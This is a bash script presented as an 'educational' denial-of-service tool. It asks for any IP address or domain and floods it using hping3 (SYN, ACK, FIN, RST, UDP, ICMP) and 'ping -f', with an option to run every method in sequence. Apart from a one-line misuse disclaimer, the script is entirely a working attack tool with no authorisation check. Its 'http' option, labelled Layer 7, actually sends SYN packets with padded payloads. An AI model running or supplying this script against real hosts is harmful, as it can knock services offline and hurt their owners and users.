#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
MAGENTA="\033[1;35m"
RESET="\033[0m"

declare -A attack_map=(
    [1]="syn" [2]="ack" [3]="fin" [4]="rst"
    [5]="udp" [6]="icmp" [7]="http" [8]="ping" [9]="all"
)

welcome_intro() {
    echo -e "${BLUE}[>]${CYAN} Welcome to the ${MAGENTA}Cybrahimi DoS Tool${CYAN}!${RESET}"
    echo -e "${YELLOW}[~] Starting tool in 3 seconds...${RESET}"
    sleep 3
}

print_banner() {
    clear
    echo -e "${MAGENTA}"
    echo "  ██████╗██╗   ██╗ ██████╗ ██████╗  █████╗ ██╗  ██╗██╗███╗   ███╗██╗"
    echo " ██╔════╝╚██╗ ██╔╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██║████╗ ████║██║"
    echo " ██║      ╚████╔╝  ██████╔╝██████╔╝███████║███████║██║██╔████╔██║██║"
    echo " ██║       ╚██╔╝   ██╔══██╗██╔══██╗██╔══██║██╔══██║██║██║╚██╔╝██║██║"
    echo " ╚██████╗   ██║    ███████║██║  ██║██║  ██║██║  ██║██║██║ ╚═╝ ██║██║"
    echo "  ╚═════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚═╝╚═╝"
    echo -e "${RESET}"
    echo -e "${BLUE}      ⚙️  Cybrahimi DoS Tool (Educational Edition)${RESET}"
    echo "      ----------------------------------------------------------"
    echo -e "         ⚠️  ${RED}For educational use only — do not misuse!${RESET}"
    echo ""
    echo -e " ➤ ${CYAN}Target types:${RESET} IP address or domain"
    echo -e " ➤ ${CYAN}Attack methods:${RESET} syn | ack | fin | rst | udp | icmp | http | ping | all"
    echo -e "${RESET}"
}

check_tools() {
    local missing=0
    for tool in hping3 dig getent ping; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[!] Required tool '$tool' is not installed.${RESET}"
            missing=$((missing + 1))
        fi
    done
    [ $missing -gt 0 ] && exit 1
}

resolve_ip() {
    local target="$1"
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$target"
    else
        local ip
        ip=$(dig +short "$target" | head -n 1)
        [ -z "$ip" ] && ip=$(getent hosts "$target" | awk '{ print $1 }' | head -n 1)
        if [ -z "$ip" ]; then
            echo -e "${RED}[!] Could not resolve: $target${RESET}" >&2
            return 1
        fi
        echo "$ip"
    fi
}

show_attack_menu() {
    echo -e "\n${CYAN}Choose an attack method:${RESET}"
    echo -e "  ${GREEN}syn [1]${RESET}   - SYN flood (TCP)"
    echo -e "  ${GREEN}ack [2]${RESET}   - ACK flood (TCP)"
    echo -e "  ${GREEN}fin [3]${RESET}   - FIN flood (TCP)"
    echo -e "  ${GREEN}rst [4]${RESET}   - RST flood (TCP)"
    echo -e "  ${GREEN}udp [5]${RESET}   - UDP flood"
    echo -e "  ${GREEN}icmp [6]${RESET}  - ICMP flood (Ping)"
    echo -e "  ${GREEN}http [7]${RESET}  - HTTP flood (Layer 7)"
    echo -e "  ${GREEN}ping [8]${RESET}  - Basic Ping flood"
    echo -e "  ${GREEN}all [9]${RESET}   - All methods (sequential)"
}

run_attack() {
    local target="$1"
    local attack_type="$2"
    local port="${3:-80}"

    local target_ip
    if ! target_ip=$(resolve_ip "$target"); then
        return 1
    fi

    echo -e "\n${GREEN}[+]${RESET} Launching ${RED}$attack_type${RESET} attack on ${CYAN}$target ($target_ip)${RESET}"
    [ "$attack_type" != "icmp" ] && [ "$attack_type" != "ping" ] && echo -e "${YELLOW}   Port: $port${RESET}"

    case "$attack_type" in
        syn)   sudo hping3 -S --flood -p "$port" "$target_ip" ;;
        ack)   sudo hping3 -A --flood -p "$port" "$target_ip" ;;
        fin)   sudo hping3 -F --flood -p "$port" "$target_ip" ;;
        rst)   sudo hping3 -R --flood -p "$port" "$target_ip" ;;
        udp)   sudo hping3 --udp --flood -p "$port" "$target_ip" ;;
        icmp)  sudo hping3 --icmp --flood "$target_ip" ;;
        http)  sudo hping3 -S -p "$port" --flood "$target_ip" -d 1200 ;;
        ping)  ping -f "$target_ip" ;;
        *)     echo -e "${RED}[!] Unknown attack type: $attack_type${RESET}" 
               return 1 ;;
    esac
}

# Create inverse mapping for attacks
declare -A attack_map_inverse
for key in "${!attack_map[@]}"; do
    attack_map_inverse[${attack_map[$key]}]=$key
done

main() {
    check_tools
    welcome_intro
    print_banner

    read -p $'\033[1;33m[?]\033[0m Enter target (IP or domain): ' target
    [ -z "$target" ] && { echo -e "${RED}[!] Target cannot be empty${RESET}"; exit 1; }

    show_attack_menu
    
    while true; do
        read -p $'\033[1;33m[?]\033[0m Enter attack method (1-9 or name): ' input
        
        input_lc=$(echo "$input" | tr '[:upper:]' '[:lower:]')
        
        if [[ "$input" =~ ^[1-9]$ ]]; then
            attack="${attack_map[$input]}"
            break
        elif [[ "$input_lc" =~ ^(syn|ack|fin|rst|udp|icmp|http|ping|all)$ ]]; then
            attack="$input_lc"
            break
        else
            echo -e "${RED}[!] Invalid input. Please enter a number (1-9) or attack name.${RESET}"
        fi
    done

    local port=80
    if [[ "$attack" =~ ^(syn|ack|fin|rst|udp|http|all)$ ]]; then
        read -p $'\033[1;33m[?]\033[0m Enter target port (default:80): ' port_input
        [ -n "$port_input" ] && port="$port_input"
    fi

    if [[ "$attack" == "all" ]]; then
        for method in syn ack fin rst udp icmp http; do
            echo -e "\n${BLUE}[>]${RESET} Executing ${MAGENTA}$method [${attack_map_inverse[$method]}]${RESET} attack"
            run_attack "$target" "$method" "$port"
            sleep 2
        done
    else
        echo -e "\n${BLUE}[>]${RESET} Initializing ${MAGENTA}$attack [${attack_map_inverse[$attack]}]${RESET} attack"
        run_attack "$target" "$attack" "$port"
    fi
}

main
